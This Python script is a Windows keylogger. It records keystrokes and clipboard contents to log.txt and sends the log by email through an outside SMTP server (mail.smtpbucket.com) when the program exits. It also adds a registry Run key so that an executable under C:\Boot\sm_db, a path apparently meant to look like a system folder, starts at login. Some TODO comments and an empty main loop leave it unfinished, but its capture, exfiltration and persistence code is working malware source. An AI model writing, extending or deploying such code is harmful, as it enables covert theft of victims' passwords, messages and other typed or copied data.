import socket
import subprocess
from datetime import datetime
from pynput import keyboard
import pyperclip
import signal
import sys
import smtplib
from email.message import EmailMessage
import os
import winreg as reg


clipboard = ''
last_key = ''
repeat_count = 0

mapped_mean_codes = {
    '\'\\x03\'': '!copy!',
    '\'\\x16\'': '!paste!',
    }

def log_clipboard(string,count=0):
    print(string)
    logfile="log.txt"
    if not os.path.exists(logfile):
        open(logfile, "w").close()
    with open("log.txt", "a") as f:
        log_start= f"{datetime.now()}"
        if count > 0:
            f.write(f"{log_start}: {string} (x{count})\n")
        else:
            f.write(f"{log_start}: {string}\n")


def handle_paste():
    clipboard_data = pyperclip.paste()
    if isinstance(clipboard_data, str) and clipboard_data.strip():
        log_clipboard(clipboard_data,0)
    else:
        log_clipboard("Empty clipboard or pasted a file",0)

def on_press(key):
    global clipboard, last_key, repeat_count
    current_key=None
    is_special_char = False
    try:
        print(str(key))

        if str(key) in mapped_mean_codes:
            current_action = mapped_mean_codes[str(key)]
            log_clipboard(current_action, repeat_count)
            if current_action == '!paste!':
                handle_paste()
            return

        if hasattr(key,"char"): #normal key
            if key.char == None: #combinations of keys
                current_key = str(key)#.replace("<", '').replace(">", '')
            else:
                current_key = key.char
                clipboard += key.char
        else:#special key
            current_key = str(key).replace("Key.", "")
            is_special_char = True
            if current_key == "space":
                clipboard += " "
                return
            if current_key == "shift_r" or current_key == "shift_l":
                return
            #handle repeating keys (holding special keys)
            # if current_key == last_key :
            #     repeat_count += 1
            #     return
            # elif current_key != last_key and repeat_count > 0:
            #     log_clipboard(last_key, repeat_count)
            #     repeat_count = 0
            # else:
            #     repeat_count = 0
        #when a special key is pressed, log the clipboard
        if len(clipboard) > 0 and is_special_char:
            log_clipboard(clipboard,repeat_count)
            clipboard = ''
        #     log_clipboard(current_key,repeat_count)
        # elif is_special_char:
        #     log_clipboard(current_key, repeat_count)

        last_key = current_key
    except Exception as e:
        print(e)
        log_clipboard("Error by pressing key: " +str(key), 0)
        pass
    # except AttributeError: #handling only with exceptions is overall slower than checking if key.char exists

#todo search another way to send free emails
def send_email():
    SMTP_SERVER = "mail.smtpbucket.com"
    SMTP_PORT = 8025
    msg = EmailMessage()
    msg["Subject"] = "Email from "#todo take os name
    msg["From"] = "hellotherewdym"
    msg["To"] = "hellotherewdym"
    with open("log.txt", "r") as f:
        file_content = f.read()
        msg.add_alternative(file_content, subtype="plain")
        #msg.add_attachment(f.read(), maintype="application", subtype="octet-stream", filename="log.txt")

    server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
    server.send_message(msg)
    server.quit()

def on_exit(signum, frame):
    global clipboard
    log_clipboard(clipboard,0)
    send_email()
    sys.exit(0)

def is_internet_connection(host="8.8.8.8", port=53, timeout=3):
    """
    Host: 8.8.8.8 (google-public-dns-a.google.com)
    OpenPort: 53/tcp
    Service: domain (DNS/TCP)
    """
    try:
        socket.setdefaulttimeout(timeout)
        socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((host, port))
        return True
    except socket.error as ex:
        print(ex)
        return False

# todo make the .exe run when pc start, when there is no internet connection save a flag to send the file after the connection is restored

folder_path = r"C:\Boot\sm_db" # todo create folder if it doesn't exist
exe_path="sm_db.exe"

def run_on_starttup():
    path = folder_path + "\\" + exe_path
    key = r"Software\Microsoft\Windows\CurrentVersion\Run"

    with reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE) as reg_key:
        reg.SetValueEx(reg_key, "MyApp", 0, reg.REG_SZ, path)

    print("Startup registry entry added.")


if __name__ == "__main__":
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    signal.signal(signal.SIGINT, on_exit)  # Handles Ctrl+C
    signal.signal(signal.SIGTERM, on_exit)  # Handles OS termination

    while True:
        #TODO CODE HERE


        #TODO END CODE HERE
        listener.join()